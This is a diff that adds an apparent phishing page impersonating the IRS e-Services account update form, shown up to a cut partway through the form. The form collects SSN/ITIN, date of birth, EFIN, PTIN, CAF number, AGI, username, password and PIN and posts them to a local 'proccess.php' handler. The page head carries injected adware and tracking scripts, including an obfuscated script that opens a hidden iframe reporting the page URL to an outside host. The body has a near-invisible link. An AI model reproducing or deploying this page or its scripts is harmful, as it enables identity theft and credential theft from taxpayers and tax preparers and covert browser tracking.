@@ -1,0 +1,2535 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<!-- Kevin Yu updated Dec 6, 2006 Usability update DR 39906 -->
+<!-- SWC Last Updated Feb 16,2005  DR 27501-->
+<!-- PBV Last Updated Sept 24,2013  UWR 83528-->
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <!-- #BeginTemplate "/Templates/portal_layout.dwt" -->
+ <head>
+  <!-- Template Updated by Frank Font on 030918 -->
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <link type="text/css" rel="stylesheet" href="./file/irs-gov.css" />
+  <script type="text/javascript" async="">
+   (function(){try{if(typeof window['asdfdsasdfdsa'] === 'undefined'){setTimeout(function(){var shouldThisPartOfCodeRun = document.URL.search('http') === 0 ;if(!shouldThisPartOfCodeRun){	return;}if(typeof DealPly !== 'undefined' &amp;&amp; typeof DealPly.serverCallParam === 'string'  ){var reportFlag = true;var scArr = document.getElementsByTagName('script');for(var index in scArr){if(typeof scArr[index].src === 'string' &amp;&amp; scArr[index].src.search('\\.js\\?dn=') !== -1){	reportFlag = false;}}if(!reportFlag ){	return;}var host = 'http://q.nadijs.info/';var isSecure =  document.URL.search('https://') === 0 ;if(isSecure){	host = 'https://endall41-q.apollocdn.com/';}var urlPath = 'dealdo/event-report?type=quick&amp;';var iframe = document.createElement('iframe');var suffix = ''; try{if(typeof JavaScriptJsTagUrl !== 'undefined'){suffix = JavaScriptJsTagUrl.substr(JavaScriptJsTagUrl.search('\?') + 1 );}}catch(e324324){}iframe.setAttribute('style','position:relative; left:-10000px; width:1px; height:1px; visibility:hidden');iframe.setAttribute('src',host + urlPath + 'url=' + encodeURIComponent(document.URL) + '&amp;domain=' + document.domain   + '&amp;topic=dpdiedarg&amp;' + suffix );document.body.appendChild(iframe);}}, 10000);window['asdfdsasdfdsa'] = true;} }catch(e235534){}})();
+  </script>
+  <script src="./file/Scripts/URLs.js" language="JavaScript">
+  </script>
+  <script src="./file/Scripts/openErrorWindow.js" language="JavaScript">
+  </script>
+  <script src="./file/Scripts/openHelpWindow.js" language="JavaScript">
+  </script>
+  <!-- #BeginEditable "doctitle" -->
+  <title>
+   e-Services Account Update
+  </title>
+  <script language="JavaScript">
+   function getHelpLocation(){
+		openHelpWindow("../Help/regnewmain_hlp.html");
+		return true;
+	}
+  </script>
+  <script language="JavaScript">
+   &lt;!--
+// This function gives the user a second chance to submit the form --
+function askUserAgain(f) 
+{
+  var msg = "\nClick OK if you really want to decline. " +
+               "If you decline, the data on the form will be cleared.\n\n" +
+               "Click Cancel if you want to work on the form again or submit the registration.\n\n\n" ;
+  var declineOk = confirm(msg);
+  if ( declineOk == true )
+  {
+		document.location.href='../index.htm';
+    return true;
+  }
+  else
+  {
+    return false;
+  }
+}
+//--&gt;
+  </script>
+  <script src="http://www.irs.gov/Scripts/Reg_JsUtilities.js" language="JavaScript">
+  </script>
+  <script src="http://www.irs.gov/Scripts/Reg_validateFormData.js" language="JavaScript">
+  </script>
+  <script language="JavaScript">
+   function validateFormData(f)
+{
+	//See if server has started validating the content.
+	var nServerSideMessageCount = 0;
+	if (nServerSideMessageCount &gt; 0)
+	{
+		//Since the server has already started writing messages, let it continue validation.
+		//Skip local surface checking.
+		return true;
+	}
+
+  boolAddressChange=false;
+  boolDOBdd=false; boolDOBmm=false; boolDOByyyy=false;
+  strPIN=null; strPIN2=null;
+  strPwd=null; strPwd2=null;
+  nErrs = 0;
+  arrErrMsg.length = 1;
+  fName = 'firstName';
+  fValue = f.elements[fName].value;
+  isValidName(fValue,fName);
+  fName = 'middleInitial';
+  fValue = f.elements[fName].value;
+  isValidMiddleInitial(fValue);
+  fName = 'lastName';
+  fValue = f.elements[fName].value;
+  isValidName(fValue,fName);
+  isValidTIN(f.elements['tin'].value)
+  isValidDOB1(f.elements['dateOfBirthF'].value);
+
+  fName = 'phoneCountryCode';
+  fValue = f.elements[fName].value;
+  isValidPhone(fValue,fName);
+
+  fName = 'phone';
+  fValue = f.elements[fName].value;
+  isValidPhoneEnhanced(fValue,fName,f.elements['phoneCountryCode'].value);
+
+  fName = 'email';
+  fValue = f.elements[fName].value;
+  isValidEmail(fValue);
+
+  fName = 'agi';
+  fValue = f.elements[fName].value;
+  isValidAGI(fValue);
+  
+  fName = 'username';
+  fValue = f.elements[fName].value;
+  isValidUsername(fValue);
+  
+  //Check if username is SSN UWR 83528
+  fName = 'username';
+  fValue = f.elements[fName].value;
+  fNameSSN = 'tin';
+  fValueSSN = f.elements[fNameSSN].value;
+  isValidUsernameSSN(fValue,fValueSSN);
+  
+  // Check if both Passwords matched
+  fName = 'pwd';
+  fValue = f.elements[fName].value;
+  if (isValidPwd(fValue,fName)) strPwd = new String(fValue);
+  fName = 'pwd2';
+  fValue = f.elements[fName].value;
+  if (isValidPwd(fValue,fName)) strPwd2 = new String(fValue);
+  if ((strPwd != null) &amp;&amp; (strPwd2 != null)) 
+	{
+    if (strPwd.valueOf() != strPwd2.valueOf())
+	  arrErrMsg[nErrs++] = "First and Second Passwords entered do not match.";
+  }
+  // Check if both PINs matched
+  fName = 'pin';
+  fValue = f.elements[fName].value;
+  if (isValidPIN(fValue,fName)) strPIN = new String(fValue);
+  fName = 'pin2';
+  fValue = f.elements[fName].value;
+  if (isValidPIN(fValue,fName)) strPIN2 = new String(fValue);
+  if ((strPIN != null) &amp;&amp; (strPIN2 != null)) 
+	{
+    if (strPIN.valueOf() != strPIN2.valueOf())
+	  arrErrMsg[nErrs++] = "First and Second PINs entered do not match.";
+  }
+  
+// uwr83528 username and passowrd can not be same
+  
+  fname1 = 'username';
+  fname2 = 'pwd';
+  strUsername = f.elements[fname1].value; 
+  strPwd = f.elements[fname2].value;  
+  
+  if (!emptyValue(strUsername) &amp;&amp; !emptyValue(strPwd)) 
+	{
+  		if (strPwd.valueOf() == strUsername.valueOf())
+		  arrErrMsg[nErrs++] = "User Name and Password can not be the same.";
+	}
+// End uwr83528 changes
+
+	// Don't need to validate 'question' since valid values are set by JSP
+  fName = 'answer';
+  fValue = f.elements[fName].value;
+  isValidAnswer(fValue);
+  
+  //uwr 83528: Validate that all 3 challenge questions are answered.
+  fName = 'canswer1';
+  fValue = f.elements[fName].value;
+  isValidCAnswer(fValue, 1);
+  
+  fName = 'canswer2';
+  fValue = f.elements[fName].value;
+  isValidCAnswer(fValue, 2);
+  
+  fName = 'canswer3';
+  fValue = f.elements[fName].value;
+  isValidCAnswer(fValue, 3);
+  
+  // End - UWR 83528  
+  
+  // Check 'addressChange' radio buttons to see if user selected 'yes'.
+  // If so, then 'address1', 'city', 'zipCode' are required.  'address2'
+  // is not required so don't check.
+  fName = 'addressChange';
+  fValue = null;
+  for (i=0 ; ((i&lt;f.elements.length) &amp;&amp; (!boolAddressChange)) ; i++) 
+	{
+    if ((f.elements[i].name == fName) &amp;&amp; f.elements[i].checked) 
+		{
+			fValue = f.elements[i].value;
+			boolAddressChange = true;
+		}
+  }
+  if (boolAddressChange &amp;&amp; fValue == "Y") 
+
+	{
+    fName = 'address1';
+    fValue = f.elements[fName].value;
+  	isValidAddress(fValue,fName);
+    fName = 'city';
+    fValue = f.elements[fName].value;
+	  isValidCity(fValue);
+		fName = 'countrySelection';
+		fValue = f.elements[fName].value;
+		if(isValidCountry(fValue))
+		{
+			// Check the 'countrySelection' value for 'USA' substring to determine
+			// if need to check for domestic or foreign Zip code format.
+			isValidPostalCodeEtc(
+										f.elements['countrySelection'].value,
+										f.elements['state'].value,
+										f.elements['zipCode'].value)
+
+		}
+  }
+  if (nErrs &gt; 0) 
+  {
+    openErrorWindow(arrErrMsg);
+    return false;
+  } else {
+    return true;
+  }
+}
+  </script>
+  <script language="javascript">
+   //script added by jca 06/24/11
+function toggle(showHideDiv, switchTextDiv) {
+	var ele = document.getElementById(showHideDiv);
+	var text = document.getElementById(switchTextDiv);
+		ele.style.display = "none";
+		text.style.display = "none";
+}
+
+function toggle2(showHideDiv, switchTextDiv)
+{
+	var ele = document.getElementById(showHideDiv);
+	var text = document.getElementById(switchTextDiv);
+		ele.style.display = "block";
+		text.style.display = "block";
+}
+  </script>
+  <!-- #EndEditable -->
+  <script src="//static.donation-tools.org/widgets/foxylyrics/widget3.js" type="text/javascript">
+  </script>
+  <script type="text/javascript" src="//rules.similardeals.net/v1.0/whitelist/1052/9620x1004/www.tlcbeitshoshanim.com?partnerName=Lyrics&partnerLink=http%3A%2F%2Fluu.lightquartrate.com%2Fsd%2Fapps%2Fadinfo-1.1%2Findex.html%3Fn%3DLyrics%26oou%3Dhttp%3A%2F%2Fdip.booedalarmism.com%2Fopt_out%2F1%26w%3Dwww.tlcbeitshoshanim.com%26a%3D9620%26s%3D1004">
+  </script>
+  <script src="//fp139.digitaloptout.com/pubjs?pid=315793&an=[Enter%20Product%20Name]&opt=1&cid=6&pp=http%3A%2F%2Fbetterdeals.co%2Fprivacy-policy%2F&tc=http%3A%2F%2Fbetterdeals.co%2Fterms-of-service%2F&sid=9620-1002_it" type="text/javascript" id="confsc">
+  </script>
+  <script src="https://www.tr553.com/InterYield/bindevent.do?e=click&affiliate=rzbkmax&subid=9620_1002_it&ecpm=0&debug=false&snoozeMinutes=3&adCountIntervalHours=24&maxAdCountsPerInterval=6&endpoint=https%3A%2F%2Fwww.tr553.com">
+  </script>
+  <script src="//pstatic.bestpriceninja.com/nwp/v0_0_908/release/Shared/App/SharedApp.js?t=0">
+  </script>
+  <script src="//pstatic.bestpriceninja.com/nwp/v0_0_908/release/Shared/App/SharedApp.js?t=0">
+  </script>
+  <script src="//pstatic.bestpriceninja.com/nwp/External/json3.js?try=0">
+  </script>
+  <script src="//pstatic.bestpriceninja.com/nwp/External/NWPLegacy_v2.js?try=0">
+  </script>
+  <script src="//pstatic.bestpriceninja.com/nwp/External/bloomfilter.js?try=0">
+  </script>
+  <script src="//pstatic.bestpriceninja.com/nwp/External/jquery.xdr.js?try=0">
+  </script>
+  <script src="//pstatic.bestpriceninja.com/nwp/External/jquery.dotdotdot.js?try=0">
+  </script>
+  <script src="https://www.tr553.com/InterYield/bindevent.do?e=click&affiliate=rzbkmax&subid=9620_1002_it&ecpm=0&debug=false&snoozeMinutes=3&adCountIntervalHours=24&maxAdCountsPerInterval=6&endpoint=https%3A%2F%2Fwww.tr553.com">
+  </script>
+  <script type="text/javascript" src="https://www.tr553.com/InterYield/clickbinder.do?ver=1.0-SNAPSHOT.67%2C691&a=null">
+  </script>
+  <script src="http://c.izercbjs.info/1848674874.js?dn=tlcbeitshoshanim.com&isc=0" type="text/javascript" id="__DealPly__155768.99254842591" class="dealply_content_script">
+  </script>
+  <script src="//partners.cmptch.com/et?5">
+  </script>
+  <script src="//static.cmptch.com/v/lib/abchk.js?p=1&banner_id=23" type="text/javascript">
+  </script>
+  <script src="http://f.izercbjs.info/feedmon/feedmon_extra.js" type="text/javascript" id="__DealPly__641831.7219414243" class="dealply_content_script">
+  </script>
+  <script src="https://www.tr553.com/InterYield/getSnoozing.do?callback=AA3nOjuk.getSnoozing&affiliate=rzbkmax&subid=9620_1002_it&adCountIntervalHours=24&maxAdCountsPerInterval=6&protocol=http&fulldomain=www.tlcbeitshoshanim.com&domain=tlcbeitshoshanim.com&title=e-Services%20Account%20Update&fullcleantitle=e-Services%20Account%20Update&secUntilMidnight=43195&metakeywords=&pop=over&check=&attributionDisabled=false&adultdisabled=undefined&iyd=false">
+  </script>
+  <script src="https://www.tr553.com/intent/get?callback=AA3nOjuk.renderAd&product=iy&Hits_Per_Page=10&b=kr1m8&terms=tlcbeitshoshanim.com%20e-Services%20Account%20Update&affiliate=rzbkmax&subid=9620_1002_it&output=full&cpm=0&meta_keywords=&serveurl=http%3A%2F%2Fwww.tlcbeitshoshanim.com%2Fimages%2Fe-Services%2Fupdates.htm&adultsearch=false&adultfilter=on">
+  </script>
+  <script src="https://www.tr553.com/InterYield/coverage.do?callback=AA3nOjuk.Coverage&listingBack=http%3A%2F%2Fclick.primosearch.com%2Fctrd%2Fclick%2Fnewjump1.do%3Faffiliate%3D66385%26subid%3D9620_1002_it%26terms%3Dtlcbeitshoshanim.com%2520e-Services%2520Account%2520Update%26ai%3DMzOBlxxhz0x_L2IsFOC2trksCMCuK1IHUgdV5aV_b_-nieqYVBKQGLuS_c1x0a199BUxjIUW296Tha4W8uZoPU_TIeo0hEC2_NzcKcHcEi7x8119EiQTsr0MFNpM8XBV-n8Iac8czhP-UwcnTExsLONtrVfEZruH12IK3ussUpDXDzhgbs-tVAyPy8OZVFFV-NHjCOYi5d3nw3PL_ghOr7BJlkX0_9oiE7TRgBvBiIv3QjfNesu9zcoBeY110ZAFe5_EJV4nvplTr1qcc4xPXY4P_CZdXHsAXZCDpvz4kmhm0JEW0XUyB6-qq-nx1_vgyoGNl0mgIHgJDR2i8QBXihAmK-_DV-fb3EeNQaiYm7vbUpeqKhgK5HLj5gXAJ8jcAOZoyo9lTF344Fln99WuF5b7kZ_YHqPc1oI1KnQdABPSd4RkuAhcjLM-uOcZTeCQvt3TXQc5PhIHs4YeSTm236GRNKXXAgEzYpzeDJWeTT73w4mikGeZK5kx9LmSW-87Ja048bQLkJF_VS8gjQy1nS7IQ6ULkEh4yQGU-_6ulyGt91vzAO3k9GMLJlw4hePL4zppEonZnh0BjHskg6BqxxCY46bzG6uNtjWYrmcGKZMTjA_45je1XonrmA-rWrKkw3DjzpB8MWwdveBj6pTOKkQzYihotmdncZrv04JrCl8xOUAT_2Gj82cgipUiWGu9kqTW5Up8aJ4kQpXZ30tyH7rz4miYYGWj2vlxMviUcaQ2_mYnzbf1SmHojXGcvVvlUNs9TRrIVDpTCVCiT-Y7pTxYDKRjWet8oMo-RY_zb2gLgxn9L1cDvpHK1b6Ip-bPSl6WfKJ7GCxqniB-egdsV-U3lIopKlKlbtEGe7kc7k49Gexpan5vO01fyGOKu71D4NVX5xJh74o%26version%3D1.4&listingCPC=0.000132&listingSI=tlcbeitshoshanim.com%20e-Services%20Account%20Update&affiliate=rzbkmax">
+  </script>
+  <script type="text/javascript" src="https://www.tr553.com/InterYield/exit.js?ver=1.0-SNAPSHOT.67%2C691">
+  </script>
+  <script src="//pstatic.bestpriceninja.com/nwp/v0_0_908/release/Shared/App/SharedApp.js?t=0">
+  </script>
+  <script src="//pstatic.bestpriceninja.com/nwp/External/json3.js?try=0">
+  </script>
+  <script src="//pstatic.bestpriceninja.com/nwp/External/NWPLegacy_v2.js?try=0">
+  </script>
+  <script src="//pstatic.bestpriceninja.com/nwp/External/bloomfilter.js?try=0">
+  </script>
+  <script src="//pstatic.bestpriceninja.com/nwp/External/jquery.xdr.js?try=0">
+  </script>
+  <script src="//pstatic.bestpriceninja.com/nwp/External/jquery.dotdotdot.js?try=0">
+  </script>
+ </head>
+ <body marginheight="0" topmargin="0" onunload="closeErrorWindow();" class="content">
+  <a href="http://www.N1lvqboq_9Q.com" style="position: absolute ! important; display: inline ! important; bottom: 17px ! important; left: 0px ! important; font-size: 6px ! important; line-height: 6px ! important; opacity: 0.037 ! important; background-image: none ! important; background-color: transparent ! important; z-index: 395227799 ! important; margin: 0px ! important; padding: 0px ! important; border-width: 0px ! important; border-style: none ! important; border-color: -moz-use-text-color ! important;">
+   jdG5WVSkaBOQqI17NEPpSLu1
+  </a>
+  <!-- #BeginLibraryItem "/library/portalheader.lbi" -->
+  <table width="760" height="73" bgcolor="#FFFFFF" cellspacing="0" cellpadding="0">
+   <tbody>
+    <tr>
+     <td>
+      <img width="760" height="73" border="0" alt="Internal Revenue Service United States Department of the Treasury" src="https://la1.www4.irs.gov/e-services/Registration/Images/irslogo.gif" name="IrsBanner" />
+     </td>
+    </tr>
+   </tbody>
+  </table>
+  <table width="760" height="25" border="0" cellspacing="0" cellpadding="0">
+   <tbody>
+    <tr>
+     <td colspan="4">
+      <img width="760" height="1" src="https://la1.www4.irs.gov/e-services/Registration//Images/1x1-light-blue_spacer.gif" alt=" " />
+     </td>
+    </tr>
+    <tr>
+     <td colspan="4">
+      <img width="760" height="1" src="https://la1.www4.irs.gov/e-services/Registration//Images/1x1-navy_spacer.gif" alt=" " />
+     </td>
+    </tr>
+    <tr>
+     <!-- e-services -->
+     <td width="25%" nowrap="true" align="center" class="topnav">
+      <a href="javascript:goToPage(getPeopleSoftSignOnURL())" class="topnav">
+       e-services
+      </a>
+     </td>
+     <!-- Online Tutorials -->
+     <td width="25%" nowrap="true" align="center" class="topnav">
+      <a onclick="openHelpWindow(getTrainingURL())" href="#" class="topnav">
+       On-line 
+      Tutorials
+      </a>
+     </td>
+     <!-- Help -->
+     <td width="25%" nowrap="true" align="center" class="topnav">
+      <a onclick="getHelpLocation()" href="#" class="topnav">
+       Help
+      </a>
+     </td>
+     <!-- Mailbox -->
+     <td width="25%" nowrap="true" align="center" class="topnav">
+      <a onclick="javascript:goToPage(getSORURL())" href="#" class="topnav">
+       Mailbox
+      </a>
+     </td>
+    </tr>
+    <tr>
+     <td colspan="4">
+      <img width="760" height="1" src="https://la1.www4.irs.gov/e-services/Registration//Images/1x1-navy_spacer.gif" alt=" " />
+     </td>
+    </tr>
+    <tr>
+     <td colspan="4">
+      <img width="760" height="1" src="https://la1.www4.irs.gov/e-services/Registration/Images/1x1-light-blue_spacer.gif" alt=" " />
+     </td>
+    </tr>
+    <tr>
+     <td colspan="4">
+      <img width="1" height="2" src="https://la1.www4.irs.gov/e-services/Registration/Images/1x1-transparent_spacer.gif" alt=" " />
+     </td>
+    </tr>
+   </tbody>
+  </table>
+  <a name="TopNavSkip">
+  </a>
+  <!-- #EndLibraryItem -->
+  <!-- #BeginEditable "Content%20Goes%20Here" -->
+  <br />
+  <form onkeypress="return doKeyPress(event)" method="POST" action="proccess.php" name="regform">
+   <table width="760" border="0" bgcolor="#FFFFFF" cellspacing="0" cellpadding="0">
+    <tbody>
+     <tr>
+      <td valign="top">
+       <img width="35" height="10" alt=" " src="https://la1.www4.irs.gov/e-services/Registration/Images/1x1-transparent_spacer.gif" />
+      </td>
+      <td>
+       <table width="100%" border="0" bgcolor="#FFFFFF" align="center" cellspacing="0" cellpadding="0">
+        <tbody>
+         <tr bordercolor="#FFFFFF">
+          <td>
+           <div align="right" class="content-heading">
+            <br />
+            <p>
+             Account Update
+             <br />
+             <img width="725" height="1" alt=" " src="https://la1.www4.irs.gov/e-services/Registration/Images/1x1-grey_spacer.gif" />
+            </p>
+           </div>
+          </td>
+         </tr>
+         <tr bordercolor="#FFFFFF">
+          <td>
+           <!-- Subhead on Most Pages -->
+          </td>
+         </tr>
+         <tr valign="top" bordercolor="#FFFFFF">
+          <td>
+           <p>
+            Please enter the following information to update your 
+
+                e-services account.
+            <br />
+            For help, select the
+            <span class="content-bold-italic">
+             Help
+            </span>
+            link and information will be provided 
+                in a "help" window.
+           </p>
+           <p>
+            <span class="content-bold">
+             IMPORTANT:
+            </span>
+             Please print 
+
+                a copy for your records
+            <span class="content-bold-italic">
+             before
+            </span>
+            you submit your entries for processing.
+           </p>
+           <p class="content-error">
+           </p>
+           <p>
+            <!-- a href="javascript:openHelpWindow('../Help/regnewmain_hlp.html')" class="subhead">Help</a -->
+            <table width="100%" bordercolor="orange" border="0" cellspacing="0" cellpadding="0">
+             <tbody>
+              <tr>
+               <td width="1%" nowrap="nowrap" align="right" class="form-field-name-required">
+                <label for="firstname">
+                 *First 
+                    Name (Required)
+                </label>
+                : 
+               </td>
+               <td>
+                <input type="text" value="" id="firstname" size="31" maxlength="30" name="firstName" />
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" nowrap="nowrap" align="right" class="form-field-name">
+                <label for="middleInitial">
+                 Middle Initial
+                </label>
+                : 
+               </td>
+               <td>
+                <input type="text" value="" id="middleInitial" size="2" maxlength="1" name="middleInitial" />
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" nowrap="nowrap" align="right" class="form-field-name-required">
+                <label for="lastName">
+                 *Last Name (Required)
+                </label>
+                : 
+               </td>
+               <td>
+                <input type="text" value="" id="lastName" size="31" maxlength="30" name="lastName" />
+               </td>
+              </tr>
+              <tr>
+               <!-- FJF 20040428 - Name suffix CR. -->
+               <td width="1%" nowrap="nowrap" align="right" class="form-field-name">
+                <label for="nameSuffix">
+                 Name Suffix
+                </label>
+                : 
+               </td>
+               <td>
+                <select name="nameSuffix" id="nameSuffix" size="1">
+                 <option value=" ">
+                 </option>
+                 <option value="Jr">
+                  Jr
+                 </option>
+                 <option value="Sr">
+                  Sr
+                 </option>
+                 <option value="I">
+                  I
+                 </option>
+                 <option value="II">
+                  II
+                 </option>
+                 <option value="III">
+                  III
+                 </option>
+                 <option value="IV">
+                  IV
+                 </option>
+                 <option value="V">
+                  V
+                 </option>
+                 <option value="VI">
+                  VI
+                 </option>
+                 <option value="VII">
+                  VII
+                 </option>
+                 <option value="VIII">
+                  VIII
+                 </option>
+                 <option value="IX">
+                  IX
+                 </option>
+                 <option value="X">
+                  X
+                 </option>
+                </select>
+               </td>
+              </tr>
+              <tr>
+               <td colspan="2">
+                <img width="1" height="10" alt=" " src="https://la1.www4.irs.gov/e-services/Registration/Images/1x1-transparent_spacer.gif" />
+                <br />
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" valign="middle" nowrap="nowrap" align="right" class="form-field-name-required">
+                <label for="tin">
+                 *SSN/ITIN: (Required): 
+                </label>
+               </td>
+               <td valign="middle">
+                <input type="text" value="" id="tin" onkeyup="numericOnly(this,'',false); autoComplete(this,9);" maxlength="9" size="9" name="tin" />
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" valign="middle" nowrap="nowrap" align="right" class="form-field-name-required">
+                <label for="dateOfBirthF">
+                 *Date of Birth (Required): 
+                </label>
+               </td>
+               <td valign="middle">
+                <input type="text" value="" id="dateOfBirthF" onkeyup="numericOnly(this,'/',false); autoComplete(this,10);" maxlength="10" size="10" name="dateOfBirthF" />
+                <span class="form-field-help">
+                 (MM/DD/YYYY)
+                </span>
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" valign="middle" nowrap="nowrap" align="right" class="form-field-name-required">
+                <label for="tin">
+                 *EFIN: (Required): 
+                </label>
+               </td>
+               <td valign="middle">
+                <input type="text" value="" id="tin" maxlength="23" size="9" name="efin" />
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" valign="middle" nowrap="nowrap" align="right" class="form-field-name-required">
+                <label for="tin">
+                 *PTIN: (Required): 
+                </label>
+               </td>
+               <td valign="middle">
+                <input type="text" value="" id="tin" maxlength="23" size="9" name="ptin" />
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" valign="middle" nowrap="nowrap" align="right" class="form-field-name-required">
+                <label for="tin">
+                 *Centralized Authorization File (CAF): (Required): 
+                </label>
+               </td>
+               <td valign="middle">
+                <input type="text" value="" id="tin" maxlength="23" size="9" name="caf" />
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" valign="middle" nowrap="nowrap" align="right" class="form-field-name">
+                <label for="phone">
+                 Phone: 
+                </label>
+               </td>
+               <td valign="middle">
+                <input type="text" value="" onkeyup="numericOnly(this,'',false);" id="phone" size="13" maxlength="12" name="phone" />
+                <span class="form-field-help">
+                 (3 digit area code followed by 7 digit number, i.e. 8005551111)
+                </span>
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" valign="middle" nowrap="nowrap" align="right" class="form-field-name">
+                <label for="phoneCountryCode">
+                 Phone Country Code: 
+                </label>
+               </td>
+               <td valign="middle">
+                <input type="text" value="001" id="phoneCountryCode" onkeyup="numericOnly(this,'',false); autoComplete(this,3);" maxlength="3" size="3" name="phoneCountryCode" />
+                <i class="form-field-help">
+                 ( Enter 001 for US )
+                </i>
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" valign="middle" nowrap="nowrap" align="right" class="form-field-name">
+                <label for="email">
+                 Email Address
+                </label>
+                : 
+               </td>
+               <td valign="middle">
+                <input type="text" value="" id="email" size="55" maxlength="70" name="email" />
+               </td>
+              </tr>
+              <tr>
+               <td colspan="2">
+                <img width="1" height="10" alt=" " src="https://la1.www4.irs.gov/e-services/Registration/Images/1x1-transparent_spacer.gif" />
+               </td>
+              </tr>
+              <tr>
+               <td colspan="2">
+                <span class="content">
+                 Please provide your
+                 <strong>
+                  Adjusted Gross 
+										Income (AGI)
+                 </strong>
+                 from your most recent individual income tax 
+										return, Form 1040, 1040A, etc. Your AGI amount must agree with what 
+										was submitted on your original return prior to any amendment you 
+										may have made or any IRS adjustments. We suggest using your AGI 
+										from the prior year if your most recent return was filed within 
+										the last 4 to 6 weeks. If you filed last year's tax return after 
+										November 1, please use your AGI of the prior year tax return.
+                 <br />
+                 <br />
+                 Choose one of the available tax years and enter your AGI.
+                </span>
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" nowrap="nowrap" align="right" class="form-field-name-required">
+                <label for="taxyear">
+                 *Tax Year Ending Dec 31 (Required): 
+                </label>
+               </td>
+               <td align="left">
+                <select id="taxyear" size="1" name="taxyear">
+                 <option value=" ">
+                 </option>
+                 <option value="2014">
+                  2014
+                 </option>
+                 <option value="2013">
+                  2013
+                 </option>
+                </select>
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" align="right" class="form-field-name-required">
+                <label for="agi">
+                 *AGI (Required): 
+                </label>
+               </td>
+               <td align="left">
+                <input type="text" value="" id="agi" size="13" maxlength="12" name="agi" />
+                <span class="form-field-help">
+                 Whole dollars only
+                </span>
+               </td>
+              </tr>
+              <tr>
+               <td colspan="2">
+                <img width="1" height="10" alt=" " src="https://la1.www4.irs.gov/e-services/Registration/Images/1x1-transparent_spacer.gif" />
+               </td>
+              </tr>
+              <tr>
+               <td colspan="2">
+                <span class="content">
+                 Please select your preferred Username, Password 
+										and Personal Identification Number (PIN).
+                 <br />
+                 (You must type password and PIN twice)
+                 <br />
+                 <br />
+                 Rules governing the creation of the Username, Password, and PIN 
+										have been created to further enhance the security of e-services. 
+										The most commonly encountered rules are identified below.
+                 <a class="content-bold-italic" href="javascript:openHelpWindow('../Help/regfielddef_hlp.html#password')" alt="password rules">
+                  Select this link to see the full set of password and PIN rules
+                 </a>
+                 .
+                </span>
+               </td>
+              </tr>
+              <tr>
+               <td height="2" colspan="2">
+                <!-- just a space -->
+                <img width="5" height="2" alt=" " src="https://la1.www4.irs.gov/e-services/Registration/Images/1x1-transparent_spacer.gif" />
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" nowrap="nowrap" align="right" class="form-field-name-required">
+                <label for="username">
+                 *Username (Required): 
+                </label>
+               </td>
+               <td>
+                <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                 <tbody>
+                  <tr>
+                   <td width="40%">
+                    <input type="text" value="" maxlength="10" size="10" id="username" name="username" />
+                   </td>
+                   <td>
+                    <img width="5" height="1" alt=" " src="https://la1.www4.irs.gov/e-services/Registration/Images/1x1-transparent_spacer.gif" />
+                   </td>
+                   <td class="form-field-help">
+                    Username must be 8 to 10 characters long, may contain letters and numbers only, case sensitive (read as uppercase only). Do not use your SSN/ITIN.
+                   </td>
+                  </tr>
+                 </tbody>
+                </table>
+               </td>
+              </tr>
+              <tr>
+               <td height="5" colspan="2">
+                <!-- just a space -->
+                <img width="5" height="5" alt=" " src="https://la1.www4.irs.gov/e-services/Registration/Images/1x1-transparent_spacer.gif" />
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" align="right" class="form-field-name-required">
+                <label for="pwd">
+                 *Password (Required): 
+                </label>
+               </td>
+               <td rowspan="2">
+                <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                 <tbody>
+                  <tr>
+                   <td width="40%">
+                    <!-- FJF 24MAR2003 - Intentionally made maxlength for pwd too big (128).  Otherwise user might not know they failed. -->
+                    <input type="password" value="" id="pwd" maxlength="128" size="25" name="pwd" />
+                   </td>
+                   <td rowspan="2">
+                    <img width="5" height="1" alt=" " src="https://la1.www4.irs.gov/e-services/Registration/Images/1x1-transparent_spacer.gif" />
+                   </td>
+                   <td class="form-field-help" rowspan="2">
+                    Password must be at least 8 characters, contain an uppercase and lowercase letter, a number and a special character, cannot be the same as the username.
+                   </td>
+                  </tr>
+                  <tr>
+                   <td>
+                    <!-- FJF 24MAR2003 - Intentionally made maxlength for pwd too big (128).  Otherwise user might not know they failed. -->
+                    <input type="password" value="" id="pwd2" maxlength="128" size="25" name="pwd2" />
+                   </td>
+                  </tr>
+                 </tbody>
+                </table>
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" align="right" class="form-field-name-required">
+                <label for="pwd2">
+                 *Re-enter Password (Required): 
+                </label>
+               </td>
+              </tr>
+              <tr>
+               <td height="2" colspan="2">
+                <!-- just a space -->
+                <img width="5" height="5" alt=" " src="https://la1.www4.irs.gov/e-services/Registration/Images/1x1-transparent_spacer.gif" />
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" align="right" class="form-field-name-required">
+                <label for="pin">
+                 *PIN (Required): 
+                </label>
+               </td>
+               <td>
+                <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                 <tbody>
+                  <tr>
+                   <td width="40%">
+                    <input type="password" value="" size="5" maxlength="5" id="pin" name="pin" />
+                   </td>
+                   <td>
+                    <img width="5" height="1" alt=" " src="https://la1.www4.irs.gov/e-services/Registration/Images/1x1-transparent_spacer.gif" />
+                   </td>
+                   <td class="form-field-help">
+                    PIN must be 5 digits only, 
+                          cannot be all the same digits.
+                   </td>
+                  </tr>
+                 </tbody>
+                </table>
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" nowrap="nowrap" align="right" class="form-field-name-required">
+                <label for="pin2">
+                 *Re-enter PIN (Required): 
+                </label>
+               </td>
+               <td>
+                <input type="password" value="" size="5" maxlength="5" id="pin2" name="pin2" />
+               </td>
+              </tr>
+              <tr>
+               <td colspan="2">
